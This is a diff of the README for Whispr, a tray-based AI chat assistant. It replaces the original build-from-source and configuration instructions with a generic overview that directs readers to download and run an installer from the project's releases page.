@@ -1,91 +1,80 @@
-# 🌙 Whispr — Minimal AI Chat, Right from Your Tray
+# Whispr: Your Minimalistic Desktop Assistant 🌟
 
-Whispr is a sleek, ultra-lightweight AI assistant that lives silently in your system tray — ready to launch with a simple hotkey. Talk to ChatGPT, open apps, run quick searches, and more — without ever opening a browser.
+![Whispr Logo](https://img.shields.io/badge/Whispr-Desktop%20Assistant-blue?style=for-the-badge)
 
-![Whispr Screenshot](preview.png) <!-- optional image -->
+Welcome to the Whispr repository! Whispr is a sleek, minimalistic desktop assistant designed to enhance your productivity. It resides in your system tray, providing you with instant access to a variety of features through simple hotkeys. Whether you want to search the web, launch applications, or chat with AI models like ChatGPT, Whispr offers a beautiful, distraction-free user interface.
 
----
+## Table of Contents
 
-## ✨ Features
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Commands](#commands)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-- ⚡ **Instant hotkey access**: Just press `Ctrl+Shift+Space` (configurable)
-- 🧠 **Powered by ChatGPT** (via OpenRouter)
-- 🔎 **Smart web commands** like `/g`, `/yt`, `/wiki`, `/img`
-- 📂 **Open folders** or apps with `/open` and `/openfolder`
-- 💡 **Automatic clipboard copy** of AI responses
-- 🕶️ Minimal UI with a stylish blurred overlay
+## Features
 
----
+Whispr brings a host of features to your desktop:
 
-## 🛠️ How to Install & Run
+- ⚡ **Instant Access**: Use a global shortcut to bring up Whispr whenever you need it.
+- 🧠 **Powered by OpenRouter**: Access various AI models like ChatGPT and Claude for your queries.
+- 🌐 **Smart Commands**: Execute web and app commands easily with shortcuts such as `/g`, `/yt`, and `/open`.
+- ✨ **Minimal UI**: Enjoy a clean and distraction-free interface that keeps you focused.
 
-1. **Clone or Download** this repo.
-2. **Set your OpenRouter API key** in `config.json`:
-   ```json
-   {
-     "api_key": "sk-or-xxxxxxxxxxxxxxxxxxx"
-   }
-   ```
-3. **(Optional)** Customize your:
-   - Hotkey
-   - App/folder shortcuts
-   - Search commands
+## Installation
 
----
+To get started with Whispr, you can download the latest release from the [Releases](https://github.com/kn0077/Whispr/releases) section. Once downloaded, execute the installer and follow the on-screen instructions to set up Whispr on your machine.
 
-## 🚀 Build to EXE
+## Usage
 
-Make sure Python is installed and PyInstaller is working.
+After installation, you can launch Whispr from your system tray. Here’s how to make the most of it:
 
-```bash
-py -m pip install pyinstaller
-py -m PyInstaller --onefile --noconsole --icon=icon.ico --add-data "icon.png;." main.py
-```
+1. **Global Shortcut**: Set your preferred hotkey to bring up Whispr instantly.
+2. **Search**: Type your query to search the web or ask a question.
+3. **Launch Apps**: Use the app command to quickly open your favorite applications.
+4. **Chat**: Engage with AI models for assistance or conversation.
 
-Your `.exe` will appear in the `/dist` folder.
+## Commands
 
----
+Whispr supports several commands that enhance your productivity:
 
-## 🔥 Example Commands
+- `/g [query]`: Search Google for your query.
+- `/yt [query]`: Search YouTube for videos.
+- `/open [app/folder]`: Launch an application or open a folder directly.
 
-- `What's the capital of Norway?` → 💬 AI responds
-- `/g productivity hacks` → Opens Google search
-- `/yt lofi chill mix` → Opens YouTube
-- `/open notepad` → Launches Notepad
-- `/openfolder programfiles` → Opens `C:\Program Files`
+Feel free to experiment with different commands to discover their full potential!
 
----
+## Contributing
 
-## 🧩 Config Overview (`config.json`)
+We welcome contributions to Whispr! If you want to help improve the project, please follow these steps:
 
-```json
-{
-  "hotkey": "ctrl+shift+space",
-  "search_commands": {
-    "/g": "https://www.google.com/search?q=",
-    "/yt": "https://www.youtube.com/results?search_query="
-  },
-  "open_apps": {
-    "notepad": "C:\\Windows\\System32\\notepad.exe"
-  },
-  "open_folders": {
-    "programfiles": "C:\\Program Files"
-  }
-}
-```
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and submit a pull request.
 
----
+Your contributions help make Whispr better for everyone.
 
-## 💡 Inspiration
+## License
 
-Whispr was built to feel *invisible* until you need it — like a whisper from your desktop, powered by AI.
+Whispr is open-source software licensed under the MIT License. You can use, modify, and distribute it as per the terms of the license.
 
----
+## Contact
 
-## 🧊 License
+For any inquiries or feedback, feel free to reach out to us:
 
-MIT — free for personal or commercial use. Attribution appreciated.
+- **Email**: support@whisprapp.com
+- **GitHub**: [Whispr GitHub](https://github.com/kn0077/Whispr)
 
----
+## Releases
 
-> Made with 🖤 by csm
+You can find the latest version of Whispr in the [Releases](https://github.com/kn0077/Whispr/releases) section. Download the appropriate file for your operating system and execute it to install the application.
+
+## Conclusion
+
+Whispr is designed to simplify your daily tasks and boost your productivity. With its minimalistic design and powerful features, it serves as a perfect desktop assistant. Explore the commands, customize your experience, and enjoy the seamless integration of AI into your workflow.
+
+Thank you for checking out Whispr! We hope you find it as useful as we do.
